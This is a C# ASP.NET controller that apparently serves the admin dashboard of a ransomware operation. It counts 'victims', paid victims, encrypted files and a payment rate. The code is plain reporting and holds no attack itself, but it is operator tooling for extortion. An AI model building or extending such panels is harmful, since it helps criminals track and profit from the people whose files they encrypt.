using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using SomberQueenWeb_Axis_.Models;
using SomberQueenWeb_Axis_.Utilities;

using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using System.Security.Claims;
using System;
using System.Threading.Tasks;
using Dapper;

namespace SomberQueenWeb_Axis_.Controllers
{
    public class HomeController : BaseController
    {
        public HomeController(DBHelper dbHelper) : base(dbHelper) { }

        [Authorize(Roles = "admin")]
        public async Task<IActionResult> Index()
        {
            var dashboard = new AdminDashboardViewModel
            {
                TotalVictims = await _dbHelper.QueryFirstOrDefaultAsync<int>(
                    "SELECT COUNT(*) FROM users WHERE role = 'victim'"),

                TotalPaidVictims = await _dbHelper.QueryFirstOrDefaultAsync<int>(
                    @"SELECT COUNT(DISTINCT user_id) 
                      FROM logs 
                      WHERE action LIKE 'PAYMENT_VERIFY%'"),

                NewVictimsLast24h = await _dbHelper.QueryFirstOrDefaultAsync<int>(
                    @"SELECT COUNT(*) FROM users 
                      WHERE role = 'victim' AND created_at >= @dayAgo",
                    new { dayAgo = DateTime.UtcNow.AddDays(-1) }),

                TotalEncryptedFiles = await _dbHelper.QueryFirstOrDefaultAsync<int>(
                    "SELECT COUNT(*) FROM encrypted_files"),

                RecentActivities = await _dbHelper.QueryAsync<LogViewModel>(
                    @"SELECT l.*, u.username 
                      FROM logs l 
                      JOIN users u ON l.user_id = u.user_id 
                      ORDER BY l.created_at DESC 
                      LIMIT 10")
            };

            var dailyStats = await _dbHelper.QueryAsync<(DateTime date, int count)>(
                @"SELECT DATE(created_at) as date, COUNT(*) as count 
                  FROM users 
                  WHERE role = 'victim' 
                    AND created_at >= @weekAgo 
                  GROUP BY DATE(created_at) 
                  ORDER BY date DESC",
                new { weekAgo = DateTime.UtcNow.AddDays(-7) });

            dashboard.DailyNewVictims = dailyStats.ToDictionary(x => x.date, x => x.count);

            if (dashboard.TotalVictims > 0)
            {
                dashboard.PaymentRate = (double)dashboard.TotalPaidVictims / dashboard.TotalVictims * 100;
            }

            return View(dashboard);
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
